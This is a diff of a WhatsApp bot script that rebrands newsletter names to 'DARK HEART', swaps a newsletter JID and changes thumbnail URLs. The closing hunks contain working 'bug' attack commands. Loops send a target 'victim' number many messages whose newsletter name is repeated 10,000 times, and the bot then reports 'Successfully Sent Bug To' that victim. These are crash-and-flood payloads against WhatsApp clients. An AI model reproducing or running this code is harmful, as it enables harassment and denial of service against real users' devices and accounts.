@@ -7608,8 +7608,8 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -7806,7 +7806,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8004,7 +8004,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8202,7 +8202,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8400,7 +8400,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8598,7 +8598,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8796,7 +8796,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -8994,7 +8994,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -9192,7 +9192,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -9390,7 +9390,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -9587,14 +9587,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -9785,14 +9785,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -9983,14 +9983,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -10181,14 +10181,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -10379,14 +10379,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -10577,14 +10577,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -10775,14 +10775,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -10973,14 +10973,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEAET🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -11171,14 +11171,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -11369,14 +11369,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -11567,14 +11567,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -11765,14 +11765,14 @@ forwardingScore: 999,
 isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
-newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterName: `DARK HEART🖤`,
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -11964,13 +11964,13 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: `Click Here to Get $69`,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "12036322239567567@newsletter",
 },
 externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
+thumbnailUrl: "https://i.ibb.co/KzYYqgm/ic-today-get-credits.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -12078,7 +12078,7 @@ m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\
 case 'xreact': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
-await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '12036322239567567@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 await sleep(2000)
 await XeonBotInc.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
 }
@@ -12088,7 +12088,7 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
 amount = text * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '12036322239567567@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 }
 break
@@ -12099,7 +12099,7 @@ await loading()
 victim = text.split("|")[0]+"@s.whatsapp.net"
 amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '12036322239567567@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 replygcxeon(`Successfully Sent Bug To ${victim}`)
 }
